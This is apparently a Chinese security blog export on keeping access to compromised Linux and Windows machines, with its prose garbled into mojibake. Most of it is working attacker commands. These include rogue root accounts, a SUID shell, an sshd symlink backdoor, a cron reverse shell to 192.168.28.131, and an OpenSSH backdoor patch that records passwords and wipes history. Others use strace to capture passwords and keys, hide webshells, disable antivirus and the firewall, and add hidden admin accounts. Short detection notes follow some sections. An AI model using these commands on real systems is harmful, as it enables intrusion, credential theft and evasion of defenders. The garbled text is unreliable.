<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd å„éƒ¨åˆ†å«ä¹‰ï¼š</span><br><span class="line">â½¤æˆ·åï¼šå¯†ç ï¼šâ½¤æˆ·IDï¼šç»„IDï¼šèº«ä»½æè¿°ï¼šâ½¤æˆ·çš„å®¶â½¬å½•ï¼šâ½¤æˆ·ç™»å½•åæ‰€ä½¿â½¤çš„SHELL</span><br><span class="line">/etc/shadow å„éƒ¨åˆ†å«ä¹‰ï¼š</span><br><span class="line">â½¤æˆ·åï¼šå¯†ç çš„MD5åŠ å¯†å€¼ï¼šâ¾ƒç³»ç»Ÿä½¿â½¤ä»¥æ¥â¼ä»¤è¢«ä¿®æ”¹çš„å¤©æ•°ï¼šâ¼ä»¤çš„æœ€â¼©ä¿®æ”¹é—´éš”ï¼šâ¼ä»¤æ›´æ”¹çš„å‘¨æœŸï¼šâ¼ä»¤å¤±æ•ˆçš„</span><br><span class="line">å¤©æ•°ï¼šâ¼ä»¤å¤±æ•ˆä»¥åå¸å·ä¼šè¢«é”å®šå¤šå°‘å¤©ï¼šâ½¤æˆ·å¸å·åˆ°æœŸæ—¶é—´ï¼šä¿ç•™å­—æ®µå°šæœªä½¿â½¤</span><br></pre></td></tr></table></figure>

<h6 id="æ·»åŠ è¶…çº§ç”¨æˆ·"><a href="#æ·»åŠ è¶…çº§ç”¨æˆ·" class="headerlink" title="æ·»åŠ è¶…çº§ç”¨æˆ·"></a>æ·»åŠ è¶…çº§ç”¨æˆ·</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$echo &quot;test:savbSWc4rx8NY:hacker:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>

<p>ä¸€äº›ç³»ç»Ÿä¸­ï¼Œå­˜æ”¾ç€åŠ å¯†åçš„ç”¨æˆ·å£ä»¤å­—ã€‚è™½ç„¶è¿™ä¸ªå­—æ®µå­˜æ”¾çš„åªæ˜¯ç”¨æˆ·å£ä»¤çš„åŠ å¯†ä¸²ï¼Œä¸æ˜¯æ˜æ–‡ï¼Œä½†<br>æ˜¯ç”±äº<code>/etc/passwd</code>æ–‡ä»¶å¯¹æ‰€æœ‰ç”¨æˆ·éƒ½å¯è¯»ï¼Œæ‰€ä»¥è¿™ä»æ˜¯ä¸€ä¸ªå®‰å…¨éšæ‚£ã€‚å› æ­¤ï¼Œç°åœ¨è®¸å¤šLinuxç³»ç»Ÿéƒ½ä½¿<br>ç”¨äº†shadowæŠ€æœ¯ï¼ŒæŠŠçœŸæ­£åŠ å¯†åçš„ç”¨æˆ·å£ä»¤å­—æ®µå­˜æ”¾åˆ°<code>/etc/shadow</code>æ–‡ä»¶ä¸­ï¼Œè€Œåœ¨<code>/etc/passwd</code>æ–‡ä»¶çš„<br>å£ä»¤å­—æ®µä¸­åªå­˜æ”¾äº†ä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦ï¼Œä¾‹å¦‚â€xâ€æˆ–è€…â€*â€</p>
<h6 id="å¦‚æœç³»ç»Ÿä¸å…è®¸uid-0çš„ç”¨æˆ·è¿œç¨‹ç™»é™†ï¼Œå¯ä»¥å¢åŠ ä¸€ä¸ªæ™®é€šç”¨æˆ·è´¦å·"><a href="#å¦‚æœç³»ç»Ÿä¸å…è®¸uid-0çš„ç”¨æˆ·è¿œç¨‹ç™»é™†ï¼Œå¯ä»¥å¢åŠ ä¸€ä¸ªæ™®é€šç”¨æˆ·è´¦å·" class="headerlink" title="å¦‚æœç³»ç»Ÿä¸å…è®¸uid=0çš„ç”¨æˆ·è¿œç¨‹ç™»é™†ï¼Œå¯ä»¥å¢åŠ ä¸€ä¸ªæ™®é€šç”¨æˆ·è´¦å·"></a>å¦‚æœç³»ç»Ÿä¸å…è®¸uid=0çš„ç”¨æˆ·è¿œç¨‹ç™»é™†ï¼Œå¯ä»¥å¢åŠ ä¸€ä¸ªæ™®é€šç”¨æˆ·è´¦å·</h6><p><code>echo &quot;test:savbSWc4rx8NY:-1:-1:-1:-1:-1:-1:500&quot; &gt;&gt; /etc/shadow</code></p>
<br>

<h5 id="æ’æŸ¥"><a href="#æ’æŸ¥" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æŸ¥è¯¢ç‰¹æƒç”¨æˆ·ç‰¹æƒç”¨æˆ·(uid ä¸º0)</span><br><span class="line">[root@localhost ~]# awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class="line"># æŸ¥è¯¢å¯ä»¥è¿œç¨‹ç™»å½•çš„å¸å·ä¿¡æ¯</span><br><span class="line">[root@localhost ~]# awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line"># é™¤rootå¸å·å¤–ï¼Œå…¶ä»–å¸å·æ˜¯å¦å­˜åœ¨sudoæƒé™ã€‚å¦‚éç®¡ç†éœ€è¦ï¼Œæ™®é€šå¸å·åº”åˆ é™¤sudoæƒé™</span><br><span class="line">[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure>

<br>

<h4 id="0x02-SUID-shell"><a href="#0x02-SUID-shell" class="headerlink" title="0x02 SUID shell"></a>0x02 SUID shell</h4><p>SUID shell æ˜¯ä¸€ç§å¯ç”¨äºä»¥æ‹¥æœ‰è€…æƒé™è¿è¡Œçš„shell</p>
<h5 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h5><p>åˆ›å»ºsuidæƒé™çš„æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /bin/bash  /tmp/.woot</span><br><span class="line">chmod 4755 /tmp/.woot</span><br><span class="line">ls -al /.woot</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·åšç›¸å½“äºå¤åˆ¶äº†ä¸€äº›æ–°çš„bashåˆ°tmpç›®å½•ä¸‹ï¼Œç„¶åå¯ä»¥åœ¨ä½¿ç”¨å®ƒæ—¶è°ƒç”¨rootæƒé™</p>
<p>ä½¿ç”¨æ™®é€šç”¨æˆ·è¿è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp/.woot</span><br><span class="line">/tmp/.woot -p   //bash2é’ˆå¯¹suidæœ‰ä¸€äº›ä¿æŠ¤æªæ–½ï¼Œä½¿ç”¨-på‚æ•°æ¥è·å–ä¸€ä¸ªroot shell</span><br></pre></td></tr></table></figure>

<h5 id="æ’æŸ¥-1"><a href="#æ’æŸ¥-1" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#æŸ¥æ‰¾å…·æœ‰suidçš„æƒé™çš„åº”ç”¨</span><br><span class="line">find / -perm +4000 -ls</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># åœ¨Linuxä¸­æŸ¥æ‰¾SUIDè®¾ç½®çš„æ–‡ä»¶</span><br><span class="line">find . -perm /4000</span><br><span class="line"># åœ¨Linuxä¸­æŸ¥æ‰¾ä½¿ç”¨SGIDè®¾ç½®çš„æ–‡ä»¶</span><br><span class="line">find . -perm /2000</span><br><span class="line"># å–æ¶ˆsæƒé™</span><br><span class="line">chmod u-s /tmp/.woot</span><br></pre></td></tr></table></figure>

<h4 id="0x03-sshå…¬ç§é’¥"><a href="#0x03-sshå…¬ç§é’¥" class="headerlink" title="0x03 sshå…¬ç§é’¥"></a>0x03 sshå…¬ç§é’¥</h4><h5 id="ä½¿ç”¨-1"><a href="#ä½¿ç”¨-1" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h5><p>åœ¨å®¢æˆ·ç«¯ä¸Šç”Ÿæˆä¸€å¯¹å…¬ç§é’¥ï¼Œç„¶åæŠŠå…¬é’¥æ”¾åˆ°æœåŠ¡å™¨ä¸Šï¼ˆ~/.ssh/authorized_keysï¼‰ï¼Œä¿ç•™ç§é’¥ã€‚å½“sshç™»å½•æ—¶ï¼Œsshç¨‹åºä¼šå‘é€ç§é’¥å»å’ŒæœåŠ¡å™¨ä¸Šçš„å…¬é’¥åšåŒ¹é…ï¼Œå¦‚æœåŒ¹é…æˆåŠŸå°±å¯ä»¥ç™»å½•äº†ã€‚</p>
<p>å®¢æˆ·ç«¯</p>
<p><code>ssh-keygen -t rsa</code></p>
<p>è¿›å…¥ <code>/root/.ssh/</code>æ–‡ä»¶å¤¹å³å¯æŸ¥çœ‹åˆ°ç”Ÿæˆå…¬ç§é’¥ï¼Œ<code>id_rsa</code>ä¸ºç§é’¥ï¼Œ<code>id_rsa.pub</code>ä¸ºå…¬é’¥ï¼Œ</p>
<p>å°†å…¬é’¥å¤åˆ¶æ”¾åˆ°ç›®æ ‡æœºå™¨ä¸Šçš„ <code>.ssh/authorized_keys</code>ä¸­     <code>echo id_rsa.pub &gt;&gt; .ssh/authorized_keys </code> </p>
<h5 id="æ’æŸ¥-2"><a href="#æ’æŸ¥-2" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h5><p>æŸ¥çœ‹ <code>/root/.ssh/authoritized_keys</code>æ˜¯å¦è¢«ä¿®æ”¹</p>
<br>

<h4 id="0x04-è½¯è¿æ¥"><a href="#0x04-è½¯è¿æ¥" class="headerlink" title="0x04 è½¯è¿æ¥"></a>0x04 è½¯è¿æ¥</h4><h5 id="ä½¿ç”¨-2"><a href="#ä½¿ç”¨-2" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h5><p>é€šè¿‡è½¯è¿æ¥å»ºç«‹ä¸€ä¸ªsshåé—¨ï¼š</p>
<p><code>ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=8888</code></p>
<p>(æ³¨:å¦‚æœç›®æ ‡åœ¨æ‰§è¡Œè½¯è¿æ¥æ—¶ä½¿ç”¨çš„å…¶ä»–è´¦æˆ·åˆ›å»ºçš„ï¼Œé‚£ä¹ˆåœ¨ç™»é™†æ—¶ä¹Ÿè¦é€‰æ‹©    å¯¹åº”çš„è´¦æˆ·å»ç™»å½•ï¼Œè€Œérootè´¦æˆ·)</p>
<p>æ‰§è¡Œå®Œå åœ¨ä»»æ„æœºå™¨ä¸Šä½¿ç”¨<code>ssh root@xxx.xxx.xxx.xxx -p 8888</code> å³å¯è¿æ¥</p>
<h5 id="æ’æŸ¥-3"><a href="#æ’æŸ¥-3" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h5><p>é€šè¿‡æŸ¥çœ‹ç«¯å£æˆ–è€…è¿›ç¨‹éƒ½ä¼šå‘ç°å¼‚å¸¸è¿æ¥ ä½¿ç”¨ <code>kill -s 9 PID</code> æ€æ‰è¿›ç¨‹å³å¯æ¸…é™¤åé—¨</p>
<p><img src="/posts/29801cba/attachment:d5517d48087cf2e1fd80aacde6f69abc" alt="æˆªå›¾"></p>
<br>

<h4 id="0x05-crontabåå¼¹shell"><a href="#0x05-crontabåå¼¹shell" class="headerlink" title="0x05 crontabåå¼¹shell"></a>0x05 crontabåå¼¹shell</h4><h5 id="ä½¿ç”¨-3"><a href="#ä½¿ç”¨-3" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h5><p>cronè¡¨è¾¾å¼åœ¨çº¿â½£æˆï¼š<a href="http://qqe2.com/cron">http://qqe2.com/cron</a></p>
<ul>
<li>åˆ›å»ºshellè„šæœ¬è„šæœ¬ </li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.28.131/12345 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><code>chmod +sx etc/test.sh</code></p>
<ul>
<li>crontab -e è®¾ç½®å®šæ—¶ä»»åŠ¡</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡</span><br><span class="line">*/1 * * * * root /etc/test.sh</span><br></pre></td></tr></table></figure>

<p>é‡å¯crondæœåŠ¡å°±å¯ç”¨ncæ¥å—shell <code>service cornd restart</code></p>
<h5 id="æ’æŸ¥-4"><a href="#æ’æŸ¥-4" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h5><p>æŸ¥çœ‹å¯ç–‘çš„å®šæ—¶ä»»åŠ¡åˆ—è¡¨</p>
<p><code>crontab -e</code></p>
<br>

<h4 id="0x06-OpenSSH-åé—¨"><a href="#0x06-OpenSSH-åé—¨" class="headerlink" title="0x06 OpenSSH åé—¨"></a>0x06 OpenSSH åé—¨</h4><h5 id="ä½¿ç”¨-4"><a href="#ä½¿ç”¨-4" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h5><p>åˆ©ç”¨opensshåé—¨ï¼Œè®¾ç½®SSHåé—¨å¯†ç åŠrootå¯†ç è®°å½•ä½ç½®ï¼Œéšè”½æ€§è¾ƒå¼ºï¼Œä¸æ˜“è¢«å‘ç°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aã€å¤‡ä»½SSHé…ç½®æ–‡ä»¶</span><br><span class="line">mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old</span><br><span class="line">mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old</span><br><span class="line">bã€è§£å‹å¹¶å®‰è£…è¡¥ä¸</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">tar zxf openssh-5.9p1.tar.gz</span><br><span class="line">cp openssh-5.9p1.patch/sshbd5.9p1.diff /openssh-5.9p1</span><br><span class="line">cd openssh-5.9p1</span><br><span class="line">patch &lt; sshbd5.9p1.diff</span><br><span class="line">cã€è®°å½•ç”¨æˆ·åå’Œå¯†ç çš„æ–‡ä»¶ä½ç½®åŠå…¶å¯†ç </span><br><span class="line">vi includes.h</span><br><span class="line">#define ILOG &quot;/tmp/1.txt&quot;           //è®°å½•ç™»å½•æœ¬æœºçš„ç”¨æˆ·åå’Œå¯†ç </span><br><span class="line">#define OLOG &quot;/tmp/2.txt&quot;           //è®°å½•æœ¬æœºç™»å½•è¿œç¨‹çš„ç”¨æˆ·åå’Œå¯†ç </span><br><span class="line">#define SECRETPW &quot;123456789&quot;        //åé—¨çš„å¯†ç </span><br><span class="line">dã€ä¿®æ”¹ç‰ˆæœ¬ä¿¡æ¯</span><br><span class="line">vi version.h</span><br><span class="line">#define SSH_VERSION &quot;å¡«å…¥ä¹‹å‰è®°ä¸‹æ¥çš„ç‰ˆæœ¬å·,ä¼ªè£…åŸç‰ˆæœ¬&quot;</span><br><span class="line">#define SSH_PORTABLE &quot;å°ç‰ˆæœ¬å·&quot;</span><br><span class="line">eã€å®‰è£…å¹¶ç¼–è¯‘</span><br><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5</span><br><span class="line">make clean</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">service sshd restart</span><br><span class="line">fã€å¯¹æ¯”åŸæ¥çš„é…ç½®æ–‡ä»¶ï¼Œä½¿é…ç½®æ–‡ä»¶ä¸€è‡´ï¼Œç„¶åä¿®æ”¹æ–‡ä»¶æ—¥æœŸã€‚</span><br><span class="line">touch -r /etc/ssh/ssh_config.old /etc/ssh/ssh_config</span><br><span class="line">touch -r /etc/ssh/sshd_config.old /etc/ssh/sshd_config</span><br><span class="line">gã€æ¸…é™¤æ“ä½œè®°å½•</span><br><span class="line">export HISTFILE=/dev/null</span><br><span class="line">export HISTSIZE=0</span><br><span class="line">echo &gt;/root/.bash_history //æ¸…ç©ºæ“ä½œæ—¥å¿—</span><br></pre></td></tr></table></figure>

<h5 id="æ’æŸ¥-5"><a href="#æ’æŸ¥-5" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#åˆ©ç”¨straceæŸ¥æ‰¾sshåé—¨</span><br><span class="line"># 1ã€è·å–å¯ç–‘è¿›ç¨‹PID</span><br><span class="line">ps aux | grep sshd</span><br><span class="line"># 2ã€è·Ÿè¸ªsshd PID</span><br><span class="line">strace -o aa -ff -p PID</span><br><span class="line"># 3ã€æŸ¥çœ‹è®°å½•å¯†ç æ‰“å¼€æ–‡ä»¶</span><br><span class="line">grep open sshd* | grep -v -e No -e null -e denied| grep WR</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="0x07-straceåé—¨"><a href="#0x07-straceåé—¨" class="headerlink" title="0x07 straceåé—¨"></a>0x07 straceåé—¨</h4><p>straceæ˜¯ä¸€ä¸ªåŠ¨æ€è·Ÿè¸ªå·¥å…·ï¼Œå®ƒå¯ä»¥è·Ÿè¸ªç³»ç»Ÿè°ƒç”¨çš„æ‰§è¡Œã€‚æˆ‘ä»¬å¯ä»¥æŠŠå®ƒå½“ä½œä¸€ä¸ªé”®ç›˜è®°å½•çš„åé—¨ï¼Œæ¥æ‰©å¤§æˆ‘ä»¬çš„ä¿¡æ¯æ”¶é›†èŒƒå›´ã€‚é€šè¿‡å…¶ä»–æ–¹å¼æ‹¿åˆ°shellï¼Œé€šè¿‡histroyï¼Œæµé‡æŠ“åŒ…ã€æˆ–è€…æœ¬åœ°æ²¡æœ‰ç¿»åˆ°å¯†ç çš„æƒ…å†µä¸‹ã€‚æˆ‘ä»¬è¦æƒ³è·å–å½“å‰<br>ä¸»æœºçš„å¯†ç ï¼Œæˆ–è€…æ˜¯é€šè¿‡è¿™å°ä¸»æœºè¿æ¥åˆ°å…¶ä»–ä¸»æœºçš„å¯†ç ã€‚</p>
<h5 id="è®°å½•sshdè¿›ç¨‹æ˜æ–‡å¯†ç "><a href="#è®°å½•sshdè¿›ç¨‹æ˜æ–‡å¯†ç " class="headerlink" title="è®°å½•sshdè¿›ç¨‹æ˜æ–‡å¯†ç "></a>è®°å½•sshdè¿›ç¨‹æ˜æ–‡å¯†ç </h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(strace -f -F -p `ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#x27;print $2&#x27;&#125;` -t -e</span><br><span class="line">trace=read,write -s 32 2&gt; /tmp/.sshd.log &amp;)</span><br></pre></td></tr></table></figure>

<p>å½“ç”¨æˆ·é€šè¿‡å¯†ç ç™»é™†æ—¶ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹è®°å½•çš„å¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep -E &#x27;read\(6, &quot;.+\\0\\0\\0\\.+&quot;&#x27; /tmp/.sshd.log</span><br></pre></td></tr></table></figure>

<h5 id="è®°å½•sshdç§é’¥"><a href="#è®°å½•sshdç§é’¥" class="headerlink" title="è®°å½•sshdç§é’¥"></a>è®°å½•sshdç§é’¥</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(strace -f -F -p `ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#x27;print $2&#x27;&#125;` -t -e</span><br><span class="line">trace=read,write -s 4096 2&gt; /tmp/.sshd.log &amp;)</span><br></pre></td></tr></table></figure>

<p>å½“ç”¨æˆ·é€šè¿‡ç§é’¥ç™»é™†æ—¶ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹è®°å½•çš„ç§é’¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep &#x27;PRIVATE KEY&#x27; /tmp/.sshd.log</span><br></pre></td></tr></table></figure>

<h5 id="é€šè¿‡å‘½ä»¤æ›¿æ¢åŠ¨æ€è·Ÿè¸ªç³»ç»Ÿè°ƒç”¨å’Œæ•°æ®ï¼Œå¯ä»¥ç”¨æ¥è®°å½•ç”¨æˆ·sshã€suã€sudoçš„æ“ä½œã€‚"><a href="#é€šè¿‡å‘½ä»¤æ›¿æ¢åŠ¨æ€è·Ÿè¸ªç³»ç»Ÿè°ƒç”¨å’Œæ•°æ®ï¼Œå¯ä»¥ç”¨æ¥è®°å½•ç”¨æˆ·sshã€suã€sudoçš„æ“ä½œã€‚" class="headerlink" title="é€šè¿‡å‘½ä»¤æ›¿æ¢åŠ¨æ€è·Ÿè¸ªç³»ç»Ÿè°ƒç”¨å’Œæ•°æ®ï¼Œå¯ä»¥ç”¨æ¥è®°å½•ç”¨æˆ·sshã€suã€sudoçš„æ“ä½œã€‚"></a>é€šè¿‡å‘½ä»¤æ›¿æ¢åŠ¨æ€è·Ÿè¸ªç³»ç»Ÿè°ƒç”¨å’Œæ•°æ®ï¼Œå¯ä»¥ç”¨æ¥è®°å½•ç”¨æˆ·sshã€suã€sudoçš„æ“ä½œã€‚</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#vim /etc/bashrcæˆ–è€… ~/.bashrc</span><br><span class="line">alias ssh=&#x27;strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh&#x27;</span><br><span class="line"># source ~/.bashrc</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>æƒé™ç»´æŒ</category>
      </categories>
      <tags>
        <tag>æƒé™ç»´æŒ</tag>
      </tags>
  </entry>
  <entry>
    <title>æƒé™ç»´æŒ-Windowsç¯‡(å¾…å®Œæˆ)</title>
    <url>/posts/709e0d6/</url>
    <content><![CDATA[<h3 id="Windowsæƒé™ç»´æŒ"><a href="#Windowsæƒé™ç»´æŒ" class="headerlink" title="Windowsæƒé™ç»´æŒ"></a>Windowsæƒé™ç»´æŒ</h3><h4 id="éšè—æŠ€å·§"><a href="#éšè—æŠ€å·§" class="headerlink" title="éšè—æŠ€å·§"></a>éšè—æŠ€å·§</h4><h5 id="æ–‡ä»¶éšè—"><a href="#æ–‡ä»¶éšè—" class="headerlink" title="æ–‡ä»¶éšè—"></a>æ–‡ä»¶éšè—</h5><p><code>attrib +s +a +h +r c:\test</code></p>
<p>æŠŠåŸæœ¬çš„â½‚ä»¶å¤¹å¢åŠ äº†ç³»ç»Ÿâ½‚ä»¶å±æ€§ã€å­˜æ¡£â½‚ä»¶å±æ€§ã€åªè¯»â½‚ä»¶å±æ€§å’Œéšè—â½‚ä»¶å±æ€§ã€‚</p>
<h5 id="ç³»ç»Ÿæ–‡ä»¶å¤¹å›¾æ ‡"><a href="#ç³»ç»Ÿæ–‡ä»¶å¤¹å›¾æ ‡" class="headerlink" title="ç³»ç»Ÿæ–‡ä»¶å¤¹å›¾æ ‡"></a>ç³»ç»Ÿæ–‡ä»¶å¤¹å›¾æ ‡</h5><h6 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h6><ul>
<li>1.æ–°å»ºæ–‡ä»¶å¤¹ å¹¶å°†æ–‡ä»¶å­˜å…¥</li>
<li>2.ä¿®æ”¹å‘½åä¸º æˆ‘çš„ç”µè„‘.{20D04FE0-3AEA-1069-A2D8-08002B30309D} ç„¶åè®¿é—®è¯¥æ–‡ä»¶å¤¹ï¼Œæ‰“å¼€ä¼šæ‰“å¼€æˆ‘çš„ç”µè„‘</li>
<li>3.å¦‚æœéœ€è¦æŸ¥çœ‹å†…å®¹ å¯ä»¥ä½¿ç”¨winrar ç­‰å»æŸ¥çœ‹æˆ– æ¢å¤</li>
</ul>
<h6 id="ä»£å·"><a href="#ä»£å·" class="headerlink" title="ä»£å·"></a>ä»£å·</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æˆ‘çš„ç”µè„‘.&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;</span><br><span class="line">å›æ”¶ç«™.&#123;645ff040-5081-101b-9f08-00aa002f954e&#125;</span><br><span class="line">æ‹”å·â½¹ç»œ.&#123;992CFFA0-F557-101A-88EC-00DD010CCC48&#125;</span><br><span class="line">æ‰“å°æœº.&#123;2227a280-3aea-1069-a2de-08002b30309d&#125;</span><br><span class="line">æ§åˆ¶â¾¯æ¿.&#123;21ec2020-3aea-1069-a2dd-08002b30309d&#125;</span><br><span class="line">â½¹ä¸Šé‚»å±….&#123;208D2C60-3AEA-1069-A2D7-08002B30309D&#125;</span><br></pre></td></tr></table></figure>

<h5 id="ç•¸å½¢ç›®å½•"><a href="#ç•¸å½¢ç›®å½•" class="headerlink" title="ç•¸å½¢ç›®å½•"></a>ç•¸å½¢ç›®å½•</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#åˆ›å»ºç›®å½•</span><br><span class="line">md a...\      //ä¸‰ä¸ªç‚¹,å®é™…æ˜¾ç¤ºä¸º a..</span><br><span class="line">#å¤åˆ¶æ–‡ä»¶</span><br><span class="line">copy test a...\test</span><br><span class="line">#åˆ é™¤ç›®å½•</span><br><span class="line">rd /s /q a...\</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="åˆ©ç”¨ç³»ç»Ÿä¿ç•™æ–‡ä»¶ååˆ›å»ºæ— æ³•åˆ é™¤çš„webshell"><a href="#åˆ©ç”¨ç³»ç»Ÿä¿ç•™æ–‡ä»¶ååˆ›å»ºæ— æ³•åˆ é™¤çš„webshell" class="headerlink" title="åˆ©ç”¨ç³»ç»Ÿä¿ç•™æ–‡ä»¶ååˆ›å»ºæ— æ³•åˆ é™¤çš„webshell"></a>åˆ©ç”¨ç³»ç»Ÿä¿ç•™æ–‡ä»¶ååˆ›å»ºæ— æ³•åˆ é™¤çš„webshell</h5><p>ï¼ˆæ³¨: ç«ç»’å°±å¯ä»¥ç²‰ç¢â€¦ï¼‰</p>
<p>Windows ä¸‹ä¸èƒ½å¤Ÿä»¥ä¸‹é¢è¿™äº›å­—æ ·æ¥å‘½åæ–‡ä»¶/æ–‡ä»¶å¤¹ï¼ŒåŒ…æ‹¬ï¼šauxï¼Œcom1ï¼Œcom2ï¼Œprnï¼Œconå’Œnulç­‰ï¼Œä½†æ˜¯é€šè¿‡cmdä¸‹æ˜¯å¯ä»¥åˆ›å»ºæ­¤ç±»æ–‡ä»¶å¤¹çš„ï¼Œä½¿ç”¨copyå‘½ä»¤å³å¯å®ç°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ–¹æ³•</span><br><span class="line">copy 1.jsp   \\.\E:\test\aux.jsp</span><br><span class="line">del \\.\E:\test\aux.jsp</span><br><span class="line">type \\.\E:\test\aux.jsp</span><br><span class="line"></span><br><span class="line">#å¯ä»¥ä½¿ç”¨attribéšè—æ–‡ä»¶ </span><br><span class="line">#è¿™ç§åœ¨è®¾ç½®æ˜¾ç¤ºéšè—æ–‡ä»¶å/dir  ä¹Ÿæ— æ³•çœ‹åˆ°</span><br><span class="line">attrib 1.txt //æŸ¥çœ‹â½‚ä»¶å±æ€§ </span><br><span class="line">attrib 1.txt -r -s //åˆ é™¤â½‚ä»¶å±æ€§</span><br><span class="line">attrib +H +S 1.asp æ”¹å˜â½‚ä»¶å±æ€§ï¼Œéšè—1.asp</span><br><span class="line">attrib -H -S 1.asp </span><br></pre></td></tr></table></figure>

<h5 id="é©±åŠ¨çº§æ–‡ä»¶éšè—"><a href="#é©±åŠ¨çº§æ–‡ä»¶éšè—" class="headerlink" title="é©±åŠ¨çº§æ–‡ä»¶éšè—"></a>é©±åŠ¨çº§æ–‡ä»¶éšè—</h5><p>å¯ä»¥åˆ©ç”¨ <code>Easy File Locker </code> å¯¹æ–‡ä»¶å¤¹è¿›è¡Œéšè—</p>
<p> ä¸‹è½½é“¾æ¥ï¼š <a href="http://www.xoslab.com/efl.html">http://www.xoslab.com/efl.html</a></p>
<br>

<br>

<h4 id="å…³é—­æ€è½¯"><a href="#å…³é—­æ€è½¯" class="headerlink" title="å…³é—­æ€è½¯"></a>å…³é—­æ€è½¯</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//meterperterä¸­ä½¿ç”¨</span><br><span class="line">run killav </span><br><span class="line">//å…³é—­é˜²ç«å¢™</span><br><span class="line">netsh advfirewall set allprofiles state off </span><br><span class="line">//å…³é—­windowsdefender</span><br><span class="line">net stop windefend </span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰å‡ ä¸ªå¤§ä½¬githubä¸Šå…³æ€è½¯çš„é¡¹ç›®</p>
<p><a href="https://github.com/Yaxser/Backstab">https://github.com/Yaxser/Backstab</a></p>
<p><a href="https://github.com/Yihsiwei/GetOut360">https://github.com/Yihsiwei/GetOut360</a></p>
<br>

<h4 id="å½±å­ç”¨æˆ·"><a href="#å½±å­ç”¨æˆ·" class="headerlink" title="å½±å­ç”¨æˆ·"></a>å½±å­ç”¨æˆ·</h4><h5 id="1-åˆ›å»ºéšè—è´¦æˆ·"><a href="#1-åˆ›å»ºéšè—è´¦æˆ·" class="headerlink" title="1.åˆ›å»ºéšè—è´¦æˆ·"></a>1.åˆ›å»ºéšè—è´¦æˆ·</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#åˆ›å»ºå®Œæˆåä»å¯ä»¥é€šè¿‡è®¡ç®—æœºç®¡ç†å’Œç™»å½•å¤„çœ‹åˆ°è¯¥ç”¨æˆ·</span><br><span class="line">net user test$ Test.123 /add</span><br><span class="line">net localgroup administrators test$ /add</span><br></pre></td></tr></table></figure>

